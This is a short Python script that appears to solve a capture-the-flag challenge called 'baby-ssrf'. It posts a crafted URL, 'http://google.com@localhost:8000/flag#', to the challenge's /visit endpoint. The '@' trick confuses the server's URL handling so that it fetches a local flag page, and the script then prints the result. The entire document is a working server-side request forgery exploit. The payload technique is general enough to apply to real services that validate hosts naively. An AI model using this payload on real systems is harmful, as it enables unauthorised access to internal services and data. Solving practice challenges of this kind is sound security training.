import requests

URL = "https://ecs-baby-ssrf.chals.io/visit"
datas = {"url":"http://google.com@localhost:8000/flag#"}
res = requests.post(URL, data=datas)
print(res.text.split('<div>')[1].split('</div>')[0])